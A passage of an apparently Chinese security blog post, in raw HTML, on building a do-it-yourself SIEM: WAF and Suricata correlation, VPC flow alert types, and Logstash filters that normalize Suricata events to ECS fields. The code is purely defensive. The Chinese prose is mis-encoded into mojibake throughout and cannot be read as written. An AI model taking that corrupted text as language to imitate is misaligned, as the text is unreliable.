<li><p>ä¸ºå®‰å…¨äº‹ä»¶å¢åŠ æ–¹å‘ä¸åŒºåŸŸçš„å­—æ®µã€‚ä¾¿äºåˆ†æäººå‘˜ç¬¬ä¸€æ—¶é—´è¯†åˆ«<strong>å†…å¯¹å†…</strong>ä»¥åŠ<strong>å†…å¯¹å¤–</strong>çš„å‘Šè­¦ã€‚ä¹Ÿå¯é’ˆå¯¹æ–¹å‘è¿›è¡Œå‘Šè­¦çº§åˆ«çš„æƒé‡è°ƒæ•´ï¼›</p>
</li>
</ul>
<h2 id="3-æå‡æ£€æµ‹èƒ½åŠ›"><a href="#3-æå‡æ£€æµ‹èƒ½åŠ›" class="headerlink" title="3. æå‡æ£€æµ‹èƒ½åŠ›"></a>3. æå‡æ£€æµ‹èƒ½åŠ›</h2><p>åº•å±‚å®‰å…¨è®¾å¤‡çš„æ£€æµ‹èƒ½åŠ›ä¸å®‰å…¨äº‹ä»¶çš„å¯ä¿¡åº¦ï¼Œæ˜¯ç›´æ¥å½±å“SIEMå‘Šè­¦çš„å…³é”®å› ç´ ã€‚</p>
<ul>
<li>æ¥å…¥Imperva WAFçš„å‘Šè­¦æ•°æ®ï¼Œä¸Suricataè¿›è¡Œè‡ªåŠ¨åŒ–å…³è”ï¼Œå®šæœŸå°†ç»•è¿‡çš„è§„åˆ™â€œç§»æ¤â€åˆ°å‰ç«¯çš„Imperva WAFä¸Šï¼ŒåŠ å¼ºè¾¹ç•Œçš„å®‰å…¨é˜²æŠ¤èƒ½åŠ›ï¼›</li>
<li>â€œæ¶ˆè´¹â€AWS VPC FLOWæ•°æ®ï¼Œå¢åŠ <strong>å†…å¯¹å¤–</strong>çš„å¼‚å¸¸è¿æ¥æ£€æµ‹èƒ½åŠ›ã€‚ç”±äºæ˜¯å››å±‚æ•°æ®èƒ½å¤Ÿè¢«<strong>â€œæ¶ˆè´¹â€</strong>çš„ç»´åº¦å®åœ¨ä¸å¤šã€‚ä¸»è¦å®ç°äº†ä»¥ä¸‹å‡ ç§å‘Šè­¦ï¼š<ul>
<li>å‘¨æœŸæ€§è¿æ¥å‘Šè­¦</li>
<li>å¨èƒæƒ…æŠ¥ç±»å‘Šè­¦</li>
<li>ç«¯å£æ‰«æç±»å‘Šè­¦<ul>
<li>çŸ­æ—¶é—´å†…ï¼Œå†…ç½‘ä¸»æœºè¯·æ±‚ç›¸åŒç›®çš„IPçš„å¤šä¸ªç«¯å£</li>
<li>çŸ­æ—¶é—´å†…ï¼Œå†…ç½‘ä¸»æœºè¯·æ±‚å¤šä¸ªIPçš„ç›¸åŒç›®çš„ç«¯å£</li>
</ul>
</li>
<li>æ•æ„Ÿç«¯å£è¯·æ±‚å‘Šè­¦</li>
</ul>
</li>
</ul>
<h2 id="4-æº¯æºåˆ†æ"><a href="#4-æº¯æºåˆ†æ" class="headerlink" title="4. æº¯æºåˆ†æ"></a>4. æº¯æºåˆ†æ</h2><p>ç›®å‰SIEMäº§ç”Ÿçš„å‘Šè­¦ï¼Œå¹¶ä¸ä¼šæºå¸¦åŸå§‹çš„å®‰å…¨äº‹ä»¶ï¼Œè¿™å¯¹äºåˆ†æå°ä¼™ä¼´æ¥è¯´å¹¶ä¸å‹å¥½ï¼Œç‰¹åˆ«æ˜¯å‘Šè­¦é‡æ¯”è¾ƒå¤šçš„æ—¶å€™ã€‚</p>
<ul>
<li>ç°å·²ä¸ºæ¯ä¸€ä¸ªå‘Šè­¦å¢åŠ äº†**â€Huntingâ€**çš„å­—æ®µï¼Œé€šè¿‡è¯¥å­—æ®µå¯ç›´æ¥æº¯æºåˆ°åº•å±‚çš„å®‰å…¨äº‹ä»¶ï¼›</li>
<li>å¢åŠ äº†æ›´é€‚ç”¨äºå®‰å…¨åˆ†æäººå‘˜ä½¿ç”¨çš„ä»ªè¡¨ç›˜ï¼›</li>
<li>ç¼–å†™äº†ä¸€ä¸ª<strong>è‡ªè®¤ä¸º</strong>æ¯”è¾ƒè´´åˆåˆ†æäººå‘˜ä½¿ç”¨çš„å·¥å…·ï¼š<strong>HappyHunting</strong>ï¼›</li>
</ul>
<h2 id="5-å…¶ä»–æ”¹è¿›"><a href="#5-å…¶ä»–æ”¹è¿›" class="headerlink" title="5. å…¶ä»–æ”¹è¿›"></a>5. å…¶ä»–æ”¹è¿›</h2><ul>
<li><p>è§£å†³äº†SIEMè”åŠ¨CDN WAF APIå“åº”æ—¶é—´è¿‡é•¿ï¼ˆ15-20åˆ†é’Ÿ ğŸ˜…ï¼‰çš„é—®é¢˜ã€‚ç›®å‰ä¸Imperva WAF APIè”åŠ¨å·²åšåˆ°äº†å‡†å®æ—¶ã€‚</p>
</li>
<li><p>ä¼˜åŒ–NTA login_auditä»£ç ï¼Œæå‡NTAæ€§èƒ½ã€‚ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ–‡ç« ã€Š**<a target="_blank" rel="noopener" href="https://canon88.github.io/2019/10/24/Suricata+Lua%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%83%85%E6%8A%A5%E5%AF%B9%E6%8E%A5/">Suricata + Luaå®ç°æœ¬åœ°æƒ…æŠ¥å¯¹æ¥</a>**ã€‹ï¼Œä¸»è¦åˆ©ç”¨äº†Luaè„šæœ¬å¯¹â€œæ•æ„Ÿâ€æ¥å£è¿›è¡Œç™»å½•å®¡è®¡å¹¶åˆ©ç”¨æƒ…æŠ¥è¿›è¡Œé«˜å±è´¦å·æ£€æµ‹ã€‚ç°å·²å°†è¿™éƒ¨åˆ†åŠŸèƒ½ç§»æ¤åˆ°Logstash + Rubyä¸Šï¼›</p>
</li>
<li><p>ä¹‹å‰çš„è‡ªåŠ¨åŒ–è”åŠ¨è§„åˆ™éƒ½æ˜¯é€šè¿‡æ‰‹åŠ¨ä¿®æ”¹è„šæœ¬è°ƒæ•´<strong>rule.id</strong>æ¥å®ç°ï¼Œè¿™ç§æ–¹å¼åœ¨åˆæœŸè¿˜èƒ½å‹‰å¼ºè¿è¡Œã€‚ä½†åœ¨åæœŸè¿è¡Œä¸­æš´éœ²å‡ºäº†ä¸è¶³ï¼Œæ—¢ä¸ä¾¿äºç®¡ç†ä¹Ÿå¢åŠ äº†ç»´æŠ¤çš„æˆæœ¬ã€‚æ‰€ä»¥ä¸ºäº†ç»´æŠ¤SIEMçš„è§„åˆ™ï¼Œè¿™é‡Œé‡‡ç”¨äº†Redisæ¥è¿›è¡Œè§„åˆ™çš„ç»Ÿä¸€ç®¡ç†ã€‚åæœŸåªéœ€è¦å°†éœ€è¦é˜»æ–­çš„<strong>rule.id</strong>æ¨é€è‡³Rediså³å¯ã€‚åŒæ—¶ä¹Ÿåœ¨è¾“å‡ºçš„å‘Šè­¦ä¸­é€šè¿‡<strong>event.action</strong>å­—æ®µæ ‡å‡†è¯¥å‘Šè­¦çš„å“åº”æ–¹å¼ï¼›</p>
</li>
</ul>
<hr>
<h1 id="â€œè¿›åŒ–â€-â€œæ•£è£…â€SIEM-v0-2"><a href="#â€œè¿›åŒ–â€-â€œæ•£è£…â€SIEM-v0-2" class="headerlink" title="â€œè¿›åŒ–â€ - â€œæ•£è£…â€SIEM v0.2"></a>â€œè¿›åŒ–â€ - â€œæ•£è£…â€SIEM v0.2</h1><h2 id="1-Workflow"><a href="#1-Workflow" class="headerlink" title="1. Workflow"></a>1. Workflow</h2><p>â€‹        è¿™æ˜¯é‡æ–°è°ƒæ•´ä¹‹åçš„<strong>â€œæ•£è£…â€SIEM v0.2</strong>çš„workflowğŸ˜ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ•°æ®æºé‡‡é›†ç«¯è¿™é‡Œå°±ä¸å±•å¼€æ¥è¯´äº†ï¼Œéƒ½æ˜¯ç°æˆçš„å·¥å…·å‘å°±å®Œäº‹å„¿äº†ã€‚ä¸‹é¢ä¸»è¦è¯´ä¸€ä¸‹Logstashä¸­å¯¹æ•°æ®å¤„ç†çš„éƒ¨åˆ†ï¼š</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-v0.2.jpg" alt="SIEM-v0.2"></p>
<hr>
<h2 id="2-æ•°æ®å¤„ç†"><a href="#2-æ•°æ®å¤„ç†" class="headerlink" title="2. æ•°æ®å¤„ç†"></a>2. æ•°æ®å¤„ç†</h2><h3 id="1-Normalized"><a href="#1-Normalized" class="headerlink" title="1. Normalized"></a>1. Normalized</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/normalized-04.png" alt="image-20201208110506481"></p>
<hr>
<h4 id="1-1-normalized-alert-to-siem"><a href="#1-1-normalized-alert-to-siem" class="headerlink" title="1.1 normalized-alert_to_siem"></a>1.1 normalized-alert_to_siem</h4><p>â€‹        é’ˆå¯¹alertäº‹ä»¶è¿›è¡Œæ ‡å‡†åŒ–ï¼Œä¹Ÿå°±æ˜¯å®‰å…¨è®¾å¤‡å‘å‡ºçš„æ•°æ®ã€‚å‚è€ƒä¸Šå›¾ä¸­è“è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†</p>
<p>â€‹        å®˜æ–¹å·²æ”¯æŒSuricataæ•°æ®çš„ECSï¼Œæˆ‘ä»¬å¯ç›´æ¥å¯ç”¨filebeatçš„Suricataæ¨¡å—ã€‚<strong>ä½†æ˜¯</strong>ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œé»˜è®¤Suricataçš„æ¨¡å—ä¸­æœ‰ä¸€äº›æ ‡å‡†åŒ–æ˜¯äº¤ç”±Elasticæ¥åšçš„ã€‚ç”±äºæˆ‘ä»¬éœ€è¦åˆ©ç”¨Logstashåšåç»­çš„ETLéƒ¨åˆ†ï¼Œæ‰€ä»¥ç°åœ¨çš„æ•´ä¸ªæ•°æ®æµæ˜¯ï¼š<strong>Filebeat -&gt; Logstash -&gt; Elastic</strong>ã€‚é‚£ä¹ˆï¼Œè¿™ä¸€éƒ¨åˆ†çš„æ ‡å‡†åŒ–ï¼Œéœ€è¦æˆ‘ä»¬åœ¨Logstashå±‚é¢æ¥å®ç°ã€‚å…·ä½“æ¶‰åŠåˆ°çš„é…ç½®å¦‚ä¸‹ï¼š</p>
<h5 id="1-1-1-normalized-suricata"><a href="#1-1-1-normalized-suricata" class="headerlink" title="1.1.1 normalized-suricata"></a>1.1.1 normalized-suricata</h5><p>â€‹    é€šç”¨Suricataäº‹ä»¶æ ‡å‡†åŒ–é…ç½®ã€‚</p>
<ul>
<li>åˆ é™¤ä¸€äº›filebeatè‡ªå¸¦çš„å­—æ®µã€‚</li>
<li>å¢åŠ <code>provider</code>ã€<code>product</code>ã€<code>sensor</code>ç­‰å­—æ®µï¼Œä¸ºäº†åæœŸåŒºåˆ†ä¸åŒçš„æ•°æ®æºç±»å‹ï¼Œï¼ˆä¾‹ï¼š<strong>NTAã€WAFã€EDR</strong>ï¼‰ï¼Œä»¥åŠä¸åŒçš„NTAäº§å“ï¼ˆä¾‹ï¼š<strong>Suricataã€Zeek</strong>ï¼‰</li>
</ul>
<h6 id="Logstash-Config"><a href="#Logstash-Config" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/59_normalized-suricata.conf">normalized-suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;application&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;agent&quot;</span>, <span class="string">&quot;@version&quot;</span>, <span class="string">&quot;[event][original]&quot;</span> ]</span><br><span class="line">        add_field =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;provider&quot;</span> =&gt; <span class="string">&quot;Suricata&quot;</span></span><br><span class="line">            <span class="string">&quot;product&quot;</span> =&gt; <span class="string">&quot;IDS&quot;</span></span><br><span class="line">            <span class="string">&quot;sensor&quot;</span> =&gt; <span class="string">&quot;%&#123;[host][name]&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        lowercase =&gt; [ <span class="string">&quot;[network][transport]&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">    uuid &#123;</span><br><span class="line">        target =&gt; <span class="string">&quot;[event][id]&quot;</span></span><br><span class="line">        overwrite =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-2-normalized-alert-for-suricata"><a href="#1-1-2-normalized-alert-for-suricata" class="headerlink" title="1.1.2 normalized-alert_for_suricata"></a>1.1.2 normalized-alert_for_suricata</h5><h6 id="Logstash-Config-1"><a href="#Logstash-Config-1" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-alert.conf">normalized-alert_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][category]&quot;</span> =&gt; <span class="string">&quot;[rule][category]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][signature_id]&quot;</span> =&gt; <span class="string">&quot;[rule][id]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][signature]&quot;</span> =&gt; <span class="string">&quot;[rule][name]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][rule]&quot;</span> =&gt; <span class="string">&quot;[rule][description]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            convert =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            copy =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[rule][category]&quot;</span> =&gt; <span class="string">&quot;message&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [suricata][eve][alert][action] == <span class="string">&quot;blocked&quot;</span> &#123;</span><br><span class="line">            mutate &#123;</span><br><span class="line">                update =&gt; &#123;</span><br><span class="line">                    <span class="string">&quot;[suricata][eve][alert][action]&quot;</span> =&gt; <span class="string">&quot;denied&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [suricata][eve][alert][action] &#123;</span><br><span class="line">            ruby &#123;</span><br><span class="line">                code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                    action = event.get(&#x27;[suricata][eve][alert][action]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    event_type = event.get(&#x27;[event][type]&#x27;)</span></span><br><span class="line"><span class="string">                    if event_type then</span></span><br><span class="line"><span class="string">                        event_type = event.get(&#x27;[event][type]&#x27;).push(action)</span></span><br><span class="line"><span class="string">                    else</span></span><br><span class="line"><span class="string">                        event_type = [action]</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[event][type]&#x27;, event_type)</span></span><br><span class="line"><span class="string">                    event.remove(&#x27;[suricata][eve][alert][action]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    event.set(&#x27;[event][action]&#x27;, action)</span></span><br><span class="line"><span class="string">                &quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][alert][severity]&quot;</span> =&gt; <span class="string">&quot;[event][severity]&quot;</span> </span><br><span class="line">                <span class="string">&quot;[suricata][eve][payload_printable]&quot;</span> =&gt; <span class="string">&quot;[rule][payload]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_request_body_printable]&quot;</span> =&gt; <span class="string">&quot;[http][request][body][content]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_response_body_printable]&quot;</span> =&gt; <span class="string">&quot;[http][response][body][content]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                rule_id = event.get(&#x27;[rule][id]&#x27;)</span></span><br><span class="line"><span class="string">                rule_name = event.get(&#x27;[rule][name]&#x27;)</span></span><br><span class="line"><span class="string">                event_id = event.get(&#x27;[event][id]&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][rule][id]&#x27;, [rule_id])</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][rule][name]&#x27;, [rule_name])</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][event][id]&#x27;, [event_id])</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-3-normalized-fileinfo-for-suricata"><a href="#1-1-3-normalized-fileinfo-for-suricata" class="headerlink" title="1.1.3 normalized-fileinfo_for_suricata"></a>1.1.3 normalized-fileinfo_for_suricata</h5><h6 id="Logstash-Config-2"><a href="#Logstash-Config-2" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-fileinfo.conf">normalized-fileinfo_for_suricatra.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][fileinfo] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][fileinfo][filename]&quot;</span> =&gt; <span class="string">&quot;[file][path]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][fileinfo][size]&quot;</span> =&gt; <span class="string">&quot;[file][size]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-4-normalized-flow-for-suricata"><a href="#1-1-4-normalized-flow-for-suricata" class="headerlink" title="1.1.4 normalized-flow_for_suricata"></a>1.1.4 normalized-flow_for_suricata</h5><h6 id="Logstash-Config-3"><a href="#Logstash-Config-3" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-flow.conf">normalized-flow_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][flow] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][pkts_toclient]&quot;</span> =&gt; <span class="string">&quot;[destination][packets]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][pkts_toserver]&quot;</span> =&gt; <span class="string">&quot;[source][packets]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][bytes_toclient]&quot;</span> =&gt; <span class="string">&quot;[destination][bytes]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][bytes_toserver]&quot;</span> =&gt; <span class="string">&quot;[source][bytes]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            init =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                @sb = 0</span></span><br><span class="line"><span class="string">                @sp = 0</span></span><br><span class="line"><span class="string">                @db = 0</span></span><br><span class="line"><span class="string">                @dp = 0</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line"></span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                events = event.to_hash</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if events.has_key?(&#x27;source&#x27;) then</span></span><br><span class="line"><span class="string">                    @sb = events[&#x27;source&#x27;].fetch(&#x27;bytes&#x27;, 0)</span></span><br><span class="line"><span class="string">                    @sp = events[&#x27;source&#x27;].fetch(&#x27;packets&#x27;, 0)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if events.has_key?(&#x27;destination&#x27;) then</span></span><br><span class="line"><span class="string">                    @db = events[&#x27;destination&#x27;].fetch(&#x27;bytes&#x27;, 0)</span></span><br><span class="line"><span class="string">                    @dp = events[&#x27;destination&#x27;].fetch(&#x27;packets&#x27;, 0)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if (@sb+@db+@sp+@dp &gt; 0) then</span></span><br><span class="line"><span class="string">                    if (@sb+@db &gt; 0) then</span></span><br><span class="line"><span class="string">                        event.set(&#x27;[network][bytes]&#x27;, @sb+@db)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                    if (@sp+@dp &gt; 0) then</span></span><br><span class="line"><span class="string">                        event.set(&#x27;[network][packets]&#x27;, @sp+@dp)</span></span><br><span class="line"><span class="string">                    end</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        date &#123;</span><br><span class="line">            match =&gt; [ <span class="string">&quot;[suricata][eve][flow][start]&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">            target =&gt; <span class="string">&quot;[event][start]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        date &#123;</span><br><span class="line">            match =&gt; [ <span class="string">&quot;[suricata][eve][flow][end]&quot;</span>, <span class="string">&quot;ISO8601&quot;</span> ]</span><br><span class="line">            target =&gt; <span class="string">&quot;[event][end]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][age]&quot;</span> =&gt; <span class="string">&quot;[event][duration]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mutate &#123;</span><br><span class="line">            remove_field =&gt; [</span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][start]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;[suricata][eve][flow][end]&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-5-normalized-http-for-suricata"><a href="#1-1-5-normalized-http-for-suricata" class="headerlink" title="1.1.5 normalized-http_for_suricata"></a>1.1.5 normalized-http_for_suricata</h5><h6 id="Logstash-Config-4"><a href="#Logstash-Config-4" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-http.conf">normalized-http_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][http] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][http_method]&quot;</span> =&gt; <span class="string">&quot;[http][request][method]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][status]&quot;</span> =&gt; <span class="string">&quot;[http][response][status_code]&quot;</span></span><br><span class="line">                <span class="string">&quot;[suricata][eve][http][hostname]&quot;</span> =&gt; <span class="string">&quot;[destination][domain]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [destination][domain] and [network][protocol] == <span class="string">&quot;http&quot;</span> &#123;</span><br><span class="line">            mutate &#123;</span><br><span class="line">                copy =&gt; &#123; <span 